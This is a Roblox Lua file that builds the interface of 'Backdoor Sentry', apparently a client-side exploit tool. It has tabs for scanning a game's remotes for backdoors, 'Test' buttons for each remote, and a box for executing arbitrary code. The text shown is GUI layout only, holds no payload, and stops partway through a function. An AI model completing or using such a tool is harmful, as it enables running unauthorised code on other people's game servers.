-- I kinda need this first
game:GetService("CoreGui")
math.randomseed(os.time()*3)

-- Gui Init Functions
function getRemoteType(remote)
	if remote:IsA("RemoteEvent") then
		return "Remote Event"
	end
	if remote:IsA("RemoteFunction") then
		return "Remote Function"
	end
end

function GetRemoteTypeColor(remote, container)
	print(container.ClassName)
	if remote:IsA("RemoteEvent") then
		if container:IsA("TextLabel") then
			container.TextColor3 = Color3.fromRGB(239, 242, 85)
		end
		if container:IsA("Frame") then
			container.BackgroundColor3 = Color3.fromRGB(239, 242, 85)
		end
	end
	if remote:IsA("RemoteFunction") then
		if container:IsA("TextLabel") then
			container.TextColor3 = Color3.fromRGB(159, 28, 225)
		end
		if container:IsA("Frame") then
			container.BackgroundColor3 = Color3.fromRGB(159, 28, 225)
		end
	end
end

function GenerateNavbar(Gui)
	local navbar = Instance.new("Frame")
	navbar.Name = "navbar"
	navbar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	navbar.BackgroundTransparency = 1
	navbar.Position = UDim2.fromScale(0.01, 0.016)
	navbar.Size = UDim2.fromScale(0.98, 0.08)
	navbar.ZIndex = 2
	navbar.Parent = Gui

	local close = Instance.new("ImageButton")
	close.Name = "Close"
	close.Image = "http://www.roblox.com/asset/?id=12550365218"
	close.ImageColor3 = Color3.fromRGB(245, 245, 245)
	close.AnchorPoint = Vector2.new(1, 0)
	close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	close.BackgroundTransparency = 1
	close.Position = UDim2.fromScale(1, 0)
	close.Size = UDim2.fromScale(0.051, 1)
	close.ZIndex = 3
	close.Parent = navbar

	local minimize = Instance.new("ImageButton")
	minimize.Name = "Minimize"
	minimize.Image = "http://www.roblox.com/asset/?id=12550460351"
	minimize.ImageColor3 = Color3.fromRGB(245, 245, 245)
	minimize.AnchorPoint = Vector2.new(1, 0)
	minimize.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	minimize.BackgroundTransparency = 1
	minimize.Position = UDim2.fromScale(0.92, 0)
	minimize.Size = UDim2.fromScale(0.051, 1)
	minimize.ZIndex = 3
	minimize.Parent = navbar
	
	--Temp Until Implemented
	minimize.Visible = false

	local icon = Instance.new("ImageLabel")
	icon.Name = "Icon"
	icon.Image = "http://www.roblox.com/asset/?id=12550422804"
	icon.ImageColor3 = Color3.fromRGB(245, 245, 245)
	icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	icon.BackgroundTransparency = 1
	icon.Size = UDim2.fromScale(0.051, 1)
	icon.ZIndex = 3
	icon.Parent = navbar

	local textLabel = Instance.new("TextLabel")
	textLabel.Name = "TextLabel"
	textLabel.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Bold,
		Enum.FontStyle.Normal
	)
	textLabel.Text = "Backdoor Sentry"
	textLabel.TextColor3 = Color3.fromRGB(245, 245, 245)
	textLabel.TextScaled = true
	textLabel.TextSize = 14
	textLabel.TextWrapped = true
	textLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	textLabel.BackgroundTransparency = 1
	textLabel.Position = UDim2.fromScale(0.0574, 0)
	textLabel.Size = UDim2.fromScale(0.255, 1)
	textLabel.ZIndex = 3
	textLabel.Parent = navbar

	local tabs = Instance.new("Frame")
	tabs.Name = "Tabs"
	tabs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	tabs.BackgroundTransparency = 1
	tabs.Position = UDim2.fromScale(0.332, 0)
	tabs.Size = UDim2.fromScale(0.51, 1)
	tabs.ZIndex = 3

	local home = Instance.new("TextButton")
	home.Name = "Home"
	home.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Bold,
		Enum.FontStyle.Normal
	)
	home.Text = "Home"
	home.TextColor3 = Color3.fromRGB(245, 245, 245)
	home.TextSize = 14
	home.AutoButtonColor = false
	home.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
	home.BorderSizePixel = 0
	home.Size = UDim2.fromScale(0.2, 1)
	home.ZIndex = 4

	local uICorner = Instance.new("UICorner")
	uICorner.Name = "UICorner"
	uICorner.Parent = home

	home.Parent = tabs

	local scan = Instance.new("TextButton")
	scan.Name = "Scan"
	scan.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Bold,
		Enum.FontStyle.Normal
	)
	scan.Text = "Scan"
	scan.TextColor3 = Color3.fromRGB(245, 245, 245)
	scan.TextSize = 14
	scan.AutoButtonColor = false
	scan.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
	scan.BackgroundTransparency = 1
	scan.BorderSizePixel = 0
	scan.Position = UDim2.fromScale(0.25, 0)
	scan.Size = UDim2.fromScale(0.2, 1)
	scan.ZIndex = 4

	local uICorner1 = Instance.new("UICorner")
	uICorner1.Name = "UICorner"
	uICorner1.Parent = scan

	scan.Parent = tabs

	local execute = Instance.new("TextButton")
	execute.Name = "Execute"
	execute.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Bold,
		Enum.FontStyle.Normal
	)
	execute.Text = "Execute"
	execute.TextColor3 = Color3.fromRGB(245, 245, 245)
	execute.TextSize = 14
	execute.AutoButtonColor = false
	execute.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
	execute.BackgroundTransparency = 1
	execute.BorderSizePixel = 0
	execute.Position = UDim2.fromScale(0.5, 0)
	execute.Size = UDim2.fromScale(0.2, 1)
	execute.ZIndex = 4

	local uICorner2 = Instance.new("UICorner")
	uICorner2.Name = "UICorner"
	uICorner2.Parent = execute

	execute.Parent = tabs

	tabs.Parent = navbar

	return minimize, close, tabs, navbar
end

function GenerateDropShadow(Gui)
	local dropShadowHolder = Instance.new("Frame")
	dropShadowHolder.Name = "DropShadowHolder"
	dropShadowHolder.BackgroundTransparency = 1
	dropShadowHolder.BorderSizePixel = 0
	dropShadowHolder.Size = UDim2.fromScale(1, 1)
	dropShadowHolder.ZIndex = 0
	dropShadowHolder.Parent = Gui

	local dropShadow = Instance.new("ImageLabel")
	dropShadow.Name = "DropShadow"
	dropShadow.Image = "rbxassetid://6014261993"
	dropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
	dropShadow.ImageTransparency = 0.5
	dropShadow.ScaleType = Enum.ScaleType.Slice
	dropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
	dropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
	dropShadow.BackgroundTransparency = 1
	dropShadow.BorderSizePixel = 0
	dropShadow.Position = UDim2.fromScale(0.5, 0.5)
	dropShadow.Size = UDim2.new(1, 47, 1, 47)
	dropShadow.ZIndex = 0
	dropShadow.Parent = dropShadowHolder
end

function GenerateScanPage(Container)
	local scan = Instance.new("Frame")
	scan.Name = "Scan"
	scan.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	scan.BackgroundTransparency = 1
	scan.Size = UDim2.fromScale(1, 1)
	scan.Visible = false
	scan.ZIndex = 2
	scan.Parent = Container

	local footer = Instance.new("TextLabel")
	footer.Name = "Footer"
	footer.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	footer.Text = "Made by Sun, Idea by Escapecole | 2023"
	footer.TextColor3 = Color3.fromRGB(242, 242, 242)
	footer.TextScaled = true
	footer.TextSize = 14
	footer.TextWrapped = true
	footer.TextXAlignment = Enum.TextXAlignment.Left
	footer.AnchorPoint = Vector2.new(0, 1)
	footer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	footer.BackgroundTransparency = 1
	footer.Position = UDim2.fromScale(0, 1)
	footer.Size = UDim2.fromScale(0.319, 0.0452)
	footer.ZIndex = 3
	footer.Parent = scan

	local loadingBar = Instance.new("Frame")
	loadingBar.Name = "LoadingBar"
	loadingBar.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
	loadingBar.Position = UDim2.fromScale(0.0191, 0.848)
	loadingBar.Size = UDim2.fromScale(0.957, 0.0679)

	local uICorner = Instance.new("UICorner")
	uICorner.Name = "UICorner"
	uICorner.Parent = loadingBar

	local bar = Instance.new("Frame")
	bar.Name = "Bar"
	bar.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	bar.BorderSizePixel = 0
	bar.Size = UDim2.fromScale(0, 1)

	local uICorner1 = Instance.new("UICorner")
	uICorner1.Name = "UICorner"
	uICorner1.Parent = bar

	bar.Parent = loadingBar

	loadingBar.Parent = scan

	local container = Instance.new("Frame")
	container.Name = "Container"
	container.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
	container.BackgroundTransparency = 0.5
	container.BorderSizePixel = 0
	container.ClipsDescendants = true
	container.Position = UDim2.fromScale(0.319, 0.0452)
	container.Size = UDim2.fromScale(0.638, 0.452)
	container.ZIndex = 2

	local uICorner2 = Instance.new("UICorner")
	uICorner2.Name = "UICorner"
	uICorner2.Parent = container

	local uIPageLayout = Instance.new("UIPageLayout")
	uIPageLayout.Name = "UIPageLayout"
	uIPageLayout.TweenTime = .2
	uIPageLayout.EasingStyle = Enum.EasingStyle.Sine
	uIPageLayout.SortOrder = Enum.SortOrder.LayoutOrder
	uIPageLayout.Parent = container

	container.Parent = scan

	local next = Instance.new("TextButton")
	next.Name = "Next"
	next.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	next.Text = "Next"
	next.TextColor3 = Color3.fromRGB(242, 242, 242)
	next.TextSize = 24
	next.TextXAlignment = Enum.TextXAlignment.Right
	next.AutoButtonColor = false
	next.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	next.BackgroundTransparency = 1
	next.Position = UDim2.fromScale(0.778, 0.52)
	next.Size = UDim2.fromScale(0.128, 0.0452)
	next.ZIndex = 3

	local imageLabel = Instance.new("ImageLabel")
	imageLabel.Name = "ImageLabel"
	imageLabel.Image = "http://www.roblox.com/asset/?id=12550650310"
	imageLabel.AnchorPoint = Vector2.new(0, 0.5)
	imageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	imageLabel.BackgroundTransparency = 1
	imageLabel.Position = UDim2.fromScale(1, 0.5)
	imageLabel.Size = UDim2.fromScale(0.35, 1.75)
	imageLabel.Parent = next

	next.Parent = scan

	local includeWorkspace = Instance.new("TextButton")
	includeWorkspace.Name = "IncludeWorkspace"
	includeWorkspace.FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json")
	includeWorkspace.Text = "Include Workspace?"
	includeWorkspace.TextColor3 = Color3.fromRGB(242, 242, 242)
	includeWorkspace.TextScaled = true
	includeWorkspace.TextSize = 24
	includeWorkspace.TextWrapped = true
	includeWorkspace.TextXAlignment = Enum.TextXAlignment.Right
	includeWorkspace.AutoButtonColor = false
	includeWorkspace.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	includeWorkspace.BackgroundTransparency = 1
	includeWorkspace.Position = UDim2.fromScale(0.0638, 0.192)
	includeWorkspace.Size = UDim2.fromScale(0.223, 0.0452)
	includeWorkspace.ZIndex = 3

	local uICorner3 = Instance.new("UICorner")
	uICorner3.Name = "UICorner"
	uICorner3.Parent = includeWorkspace

	local checkBox = Instance.new("ImageLabel")
	checkBox.Name = "CheckBox"
	checkBox.Image = "http://www.roblox.com/asset/?id=12554669883"
	checkBox.ImageColor3 = Color3.fromRGB(242, 242, 242)
	checkBox.AnchorPoint = Vector2.new(1, 0)
	checkBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	checkBox.BackgroundTransparency = 1
	checkBox.Size = UDim2.fromScale(0.114, 1)
	checkBox.Parent = includeWorkspace

	includeWorkspace.Parent = scan

	local scan1 = Instance.new("TextButton")
	scan1.Name = "Scan"
	scan1.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	scan1.Text = "Scan"
	scan1.TextColor3 = Color3.fromRGB(242, 242, 242)
	scan1.TextSize = 24
	scan1.AutoButtonColor = false
	scan1.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	scan1.Position = UDim2.fromScale(0.0319, 0.0566)
	scan1.Size = UDim2.fromScale(0.255, 0.113)
	scan1.ZIndex = 3

	local uICorner4 = Instance.new("UICorner")
	uICorner4.Name = "UICorner"
	uICorner4.Parent = scan1

	scan1.Parent = scan

	local Stage = Instance.new("TextLabel")
	Stage.Name = "Stage"
	Stage.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Light,
		Enum.FontStyle.Normal
	)
	Stage.Text = "Current Stage: Waiting For Scan"
	Stage.TextColor3 = Color3.fromRGB(242, 242, 242)
	Stage.TextScaled = true
	Stage.TextSize = 14
	Stage.TextWrapped = true
	Stage.TextXAlignment = Enum.TextXAlignment.Left
	Stage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Stage.BackgroundTransparency = 1
	Stage.Position = UDim2.fromScale(0.0191, 0.792)
	Stage.Size = UDim2.fromScale(0.957, 0.0452)
	Stage.ZIndex = 3
	Stage.Parent = scan

	local previous = Instance.new("TextButton")
	previous.Name = "Previous"
	previous.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	previous.Text = "Previous"
	previous.TextColor3 = Color3.fromRGB(242, 242, 242)
	previous.TextSize = 24
	previous.TextXAlignment = Enum.TextXAlignment.Left
	previous.AutoButtonColor = false
	previous.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	previous.BackgroundTransparency = 1
	previous.Position = UDim2.fromScale(0.37, 0.52)
	previous.Size = UDim2.fromScale(0.128, 0.0452)
	previous.ZIndex = 3

	local imageLabel1 = Instance.new("ImageLabel")
	imageLabel1.Name = "ImageLabel"
	imageLabel1.Image = "http://www.roblox.com/asset/?id=12556050159"
	imageLabel1.AnchorPoint = Vector2.new(1, 0.5)
	imageLabel1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	imageLabel1.BackgroundTransparency = 1
	imageLabel1.Position = UDim2.fromScale(0, 0.5)
	imageLabel1.Size = UDim2.fromScale(0.35, 1.75)
	imageLabel1.Parent = previous

	previous.Parent = scan

	return scan, container
end

function GenerateHomePage(Container)
	local home = Instance.new("Frame")
	home.Name = "Home"
	home.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	home.BackgroundTransparency = 1
	home.Size = UDim2.fromScale(1, 1)
	home.ZIndex = 2
	home.Parent = Container

	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Bold,
		Enum.FontStyle.Normal
	)
	title.Text = "Empowering your code, anytime, anywhere"
	title.TextColor3 = Color3.fromRGB(242, 242, 242)
	title.TextScaled = true
	title.TextSize = 14
	title.TextWrapped = true
	title.AnchorPoint = Vector2.new(0.5, 0.5)
	title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	title.BackgroundTransparency = 1
	title.Position = UDim2.fromScale(0.5, 0.3)
	title.Size = UDim2.fromScale(0.765, 0.339)
	title.ZIndex = 3

	local uIGradient = Instance.new("UIGradient")
	uIGradient.Name = "UIGradient"
	uIGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(245, 245, 245)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 64, 175)),
	})
	uIGradient.Rotation = 75
	uIGradient.Parent = title

	title.Parent = home

	local code = Instance.new("TextButton")
	code.Name = "Code"
	code.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	code.Text = "Go to Executor"
	code.TextColor3 = Color3.fromRGB(242, 242, 242)
	code.TextSize = 24
	code.TextXAlignment = Enum.TextXAlignment.Right
	code.AutoButtonColor = false
	code.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	code.BackgroundTransparency = 1
	code.Position = UDim2.fromScale(0.606, 0.622)
	code.Size = UDim2.fromScale(0.255, 0.113)
	code.ZIndex = 3

	local imageLabel = Instance.new("ImageLabel")
	imageLabel.Name = "ImageLabel"
	imageLabel.Image = "http://www.roblox.com/asset/?id=12550650310"
	imageLabel.AnchorPoint = Vector2.new(0, 0.5)
	imageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	imageLabel.BackgroundTransparency = 1
	imageLabel.Position = UDim2.fromScale(1, 0.5)
	imageLabel.Size = UDim2.fromScale(0.175, 0.7)
	imageLabel.Parent = code

	code.Parent = home

	local footer = Instance.new("TextLabel")
	footer.Name = "Footer"
	footer.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	footer.Text = "Made by Sun, Idea by Escapecole | 2023"
	footer.TextColor3 = Color3.fromRGB(242, 242, 242)
	footer.TextScaled = true
	footer.TextSize = 14
	footer.TextWrapped = true
	footer.TextXAlignment = Enum.TextXAlignment.Left
	footer.AnchorPoint = Vector2.new(0, 1)
	footer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	footer.BackgroundTransparency = 1
	footer.Position = UDim2.fromScale(0, 1)
	footer.Size = UDim2.fromScale(0.319, 0.0452)
	footer.ZIndex = 3
	footer.Parent = home

	local scan = Instance.new("TextButton")
	scan.Name = "Scan"
	scan.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	scan.Text = "Get Started"
	scan.TextColor3 = Color3.fromRGB(242, 242, 242)
	scan.TextSize = 24
	scan.AutoButtonColor = false
	scan.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	scan.Position = UDim2.fromScale(0.0957, 0.622)
	scan.Size = UDim2.fromScale(0.255, 0.113)
	scan.ZIndex = 3

	local uICorner = Instance.new("UICorner")
	uICorner.Name = "UICorner"
	uICorner.Parent = scan

	scan.Parent = home

	return home
end

function GenerateRemoteSnippet(remote, container)
	local template = Instance.new("TextButton")
	template.Name = remote.Name
	template.Text = ""
	template.AutoButtonColor = false
	template.Active = false
	template.BackgroundTransparency = 1
	template.Selectable = false
	template.Size = UDim2.fromScale(1, 0.133)
	template.ZIndex = 4
	template.Parent = container

	local colorBar = Instance.new("Frame")
	colorBar.Name = "ColorBar"
	GetRemoteTypeColor(remote, colorBar)
	colorBar.Size = UDim2.fromScale(0.01, 1)
	colorBar.ZIndex = 3
	colorBar.Parent = template

	local name = Instance.new("TextLabel")
	name.Name = "Name"
	name.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	name.Text = remote:GetFullName()
	name.TextColor3 = Color3.fromRGB(242, 242, 242)
	name.TextScaled = true
	name.TextSize = 14
	name.TextWrapped = true
	name.TextXAlignment = Enum.TextXAlignment.Left
	name.TextYAlignment = Enum.TextYAlignment.Top
	name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	name.BackgroundTransparency = 1
	name.Position = UDim2.fromScale(0.025, 0.04)
	name.Size = UDim2.fromScale(0.95, 0.6)
	name.ZIndex = 3

	local uITextSizeConstraint = Instance.new("UITextSizeConstraint")
	uITextSizeConstraint.Name = "UITextSizeConstraint"
	uITextSizeConstraint.MaxTextSize = 20
	uITextSizeConstraint.Parent = name

	name.Parent = template

	local check = Instance.new("TextLabel")
	check.Name = "Check"
	check.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Light,
		Enum.FontStyle.Normal
	)
	check.Text = "Last Checked: Unknown"
	check.TextColor3 = Color3.fromRGB(242, 242, 242)
	check.TextScaled = true
	check.TextSize = 14
	check.TextWrapped = true
	check.TextXAlignment = Enum.TextXAlignment.Left
	check.AnchorPoint = Vector2.new(1, 0)
	check.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	check.BackgroundTransparency = 1
	check.Position = UDim2.fromScale(0.975, 0.6)
	check.Size = UDim2.fromScale(0.8, 0.4)
	check.ZIndex = 3

	local uITextSizeConstraint1 = Instance.new("UITextSizeConstraint")
	uITextSizeConstraint1.Name = "UITextSizeConstraint"
	uITextSizeConstraint1.MaxTextSize = 20
	uITextSizeConstraint1.Parent = check

	check.Parent = template

	local status = Instance.new("ImageLabel")
	status.Name = "Status"
	status.Image = "http://www.roblox.com/asset/?id=12555965339"
	status.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	status.BackgroundTransparency = 1
	status.Position = UDim2.fromScale(0.05, 0.6)
	status.Size = UDim2.fromScale(0.1, 0.4)
	status.ZIndex = 3
	status.Parent = template

	return template
end


function GenerateCodePage(Container)
	local code = Instance.new("Frame")
	code.Name = "Execute"
	code.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	code.BackgroundTransparency = 1
	code.Size = UDim2.fromScale(1, 1)
	code.Visible = false
	code.ZIndex = 2

	local footer = Instance.new("TextLabel")
	footer.Name = "Footer"
	footer.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	footer.Text = "Made by Sun, Idea by Escapecole | 2023"
	footer.TextColor3 = Color3.fromRGB(242, 242, 242)
	footer.TextScaled = true
	footer.TextSize = 14
	footer.TextWrapped = true
	footer.TextXAlignment = Enum.TextXAlignment.Left
	footer.AnchorPoint = Vector2.new(0, 1)
	footer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	footer.BackgroundTransparency = 1
	footer.Position = UDim2.fromScale(0, 1)
	footer.Size = UDim2.fromScale(0.319, 0.0452)
	footer.ZIndex = 3
	footer.Parent = code

	local main = Instance.new("Frame")
	main.Name = "Main"
	main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	main.BackgroundTransparency = 1
	main.Position = UDim2.fromScale(0.319, 0.0566)
	main.Size = UDim2.fromScale(0.638, 0.848)
	main.ZIndex = 3

	local clear = Instance.new("TextButton")
	clear.Name = "Clear"
	clear.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	clear.Text = "Clear"
	clear.TextColor3 = Color3.fromRGB(242, 242, 242)
	clear.TextSize = 24
	clear.AutoButtonColor = false
	clear.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	clear.BackgroundTransparency = 1
	clear.Position = UDim2.fromScale(0, 0.867)
	clear.Size = UDim2.fromScale(0.4, 0.133)
	clear.ZIndex = 3

	local uICorner = Instance.new("UICorner")
	uICorner.Name = "UICorner"
	uICorner.Parent = clear

	clear.Parent = main

	local execute = Instance.new("TextButton")
	execute.Name = "Execute"
	execute.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	execute.Text = "Execute"
	execute.TextColor3 = Color3.fromRGB(242, 242, 242)
	execute.TextSize = 24
	execute.AutoButtonColor = false
	execute.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	execute.Position = UDim2.fromScale(0.6, 0.867)
	execute.Size = UDim2.fromScale(0.4, 0.133)
	execute.ZIndex = 3

	local uICorner1 = Instance.new("UICorner")
	uICorner1.Name = "UICorner"
	uICorner1.Parent = execute

	execute.Parent = main

	local source = Instance.new("TextBox")
	source.Name = "Source"
	source.ClearTextOnFocus = false
	source.CursorPosition = -1
	source.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json")
	source.MultiLine = true
	source.PlaceholderColor3 = Color3.fromRGB(204, 204, 204)
	source.PlaceholderText = "-- > Code Here"
	source.Text = ""
	source.TextColor3 = Color3.fromRGB(204, 204, 204)
	source.TextSize = 15
	source.TextXAlignment = Enum.TextXAlignment.Left
	source.TextYAlignment = Enum.TextYAlignment.Top
	source.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
	source.BackgroundTransparency = 0.5
	source.BorderSizePixel = 0
	source.Position = UDim2.fromOffset(30, 0)
	source.Size = UDim2.new(1, 0, 0, 300)
	source.ZIndex = 3

	local uICorner2 = Instance.new("UICorner")
	uICorner2.Name = "UICorner"
	uICorner2.Parent = source

	source.Parent = main

	main.Parent = code

	local remotes = Instance.new("ScrollingFrame")
	remotes.Name = "Remotes"
	remotes.AutomaticCanvasSize = Enum.AutomaticSize.Y
	remotes.ScrollBarImageColor3 = Color3.fromRGB(242, 242, 242)
	remotes.ScrollBarThickness = 2
	remotes.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
	remotes.BackgroundTransparency = 0.5
	remotes.BorderColor3 = Color3.fromRGB(255, 255, 255)
	remotes.BorderSizePixel = 0
	remotes.Position = UDim2.fromScale(0.0128, 0.0679)
	remotes.Selectable = false
	remotes.Size = UDim2.fromScale(0.255, 0.848)
	remotes.ZIndex = 3
	remotes.SelectionGroup = false

	local uICorner3 = Instance.new("UICorner")
	uICorner3.Name = "UICorner"
	uICorner3.CornerRadius = UDim.new(0, 4)
	uICorner3.Parent = remotes

	local uIListLayout = Instance.new("UIListLayout")
	uIListLayout.Name = "UIListLayout"
	uIListLayout.Padding = UDim.new(0, 15)
	uIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	uIListLayout.Parent = remotes

	remotes.Parent = code
	code.Parent = Container

	return code, clear, execute, source
end

function GenerateGui()
	local screenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
	screenGui.Name = "ScreenGui"
	screenGui.IgnoreGuiInset = true
	screenGui.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
	screenGui.ResetOnSpawn = false

	local main = Instance.new("Frame")
	main.Name = "main"
	main.AnchorPoint = Vector2.new(0.5, 0.5)
	main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	main.Position = UDim2.fromScale(0.5, 0.5)
	main.Size = UDim2.fromScale(0.493, 0.552)
	main.Parent = screenGui

	local uICorner = Instance.new("UICorner")
	uICorner.Name = "UICorner"
	uICorner.CornerRadius = UDim.new(0, 10)
	uICorner.Parent = main

	local uIGradient = Instance.new("UIGradient")
	uIGradient.Name = "UIGradient"
	uIGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(32, 32, 32)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 40, 40)),
	})
	uIGradient.Rotation = 75
	uIGradient.Parent = main

	local uIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
	uIAspectRatioConstraint.Name = "UIAspectRatioConstraint"
	uIAspectRatioConstraint.AspectRatio = 1.6
	uIAspectRatioConstraint.Parent = main

	local container = Instance.new("Frame")
	container.Name = "Container"
	container.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	container.BackgroundTransparency = 1
	container.Position = UDim2.fromScale(0.01, 0.1)
	container.Size = UDim2.fromScale(0.98, 0.884)
	container.Parent = main

	return screenGui, main, container
end

function GeneratePromptItem(remote,  Container)
	local template = Instance.new("Frame")
	template.Name = remote.Name
	template.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	template.BackgroundTransparency = 1
	template.Size = UDim2.fromScale(1, 1)
	template.Parent = Container

	local test = Instance.new("TextButton")
	test.Name = "Test"
	test.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	test.Text = "Test"
	test.TextColor3 = Color3.fromRGB(212, 212, 212)
	test.TextScaled = true
	test.TextSize = 24
	test.TextWrapped = true
	test.AutoButtonColor = false
	test.AnchorPoint = Vector2.new(0, 1)
	test.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	test.BackgroundTransparency = 1
	test.Position = UDim2.fromScale(0.58, 0.875)
	test.Size = UDim2.fromScale(0.4, 0.25)
	test.ZIndex = 3

	local uICorner = Instance.new("UICorner")
	uICorner.Name = "UICorner"
	uICorner.Parent = test

	local uIStroke = Instance.new("UIStroke")
	uIStroke.Name = "UIStroke"
	uIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	uIStroke.Color = Color3.fromRGB(212, 212, 212)
	uIStroke.Thickness = 2
	uIStroke.Parent = test

	local uITextSizeConstraint = Instance.new("UITextSizeConstraint")
	uITextSizeConstraint.Name = "UITextSizeConstraint"
	uITextSizeConstraint.MaxTextSize = 32
	uITextSizeConstraint.Parent = test

	test.Parent = template

	local remotePath = Instance.new("TextLabel")
	remotePath.Name = "RemotePath"
	remotePath.FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json")
	remotePath.Text = remote:GetFullName()
	remotePath.TextColor3 = Color3.fromRGB(242, 242, 242)
	remotePath.TextScaled = true
	remotePath.TextSize = 14
	remotePath.TextWrapped = true
	remotePath.TextXAlignment = Enum.TextXAlignment.Left
	remotePath.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	remotePath.BackgroundTransparency = 1
	remotePath.BorderSizePixel = 0
	remotePath.Position = UDim2.fromScale(0.02, 0)
	remotePath.Size = UDim2.fromScale(0.9, 0.15)
	remotePath.ZIndex = 3
	remotePath.Parent = template

	local RemoteType = Instance.new("TextLabel")
	RemoteType.Name = "Type"
	RemoteType.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Light,
		Enum.FontStyle.Normal
	)
	RemoteType.Text = getRemoteType(remote)
	GetRemoteTypeColor(remote, RemoteType)
	RemoteType.TextScaled = true
	RemoteType.TextSize = 14
	RemoteType.TextWrapped = true
	RemoteType.TextXAlignment = Enum.TextXAlignment.Left
	RemoteType.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	RemoteType.BackgroundTransparency = 1
	RemoteType.BorderSizePixel = 0
	RemoteType.Position = UDim2.fromScale(0.02, 0.175)
	RemoteType.Size = UDim2.fromScale(0.9, 0.1)
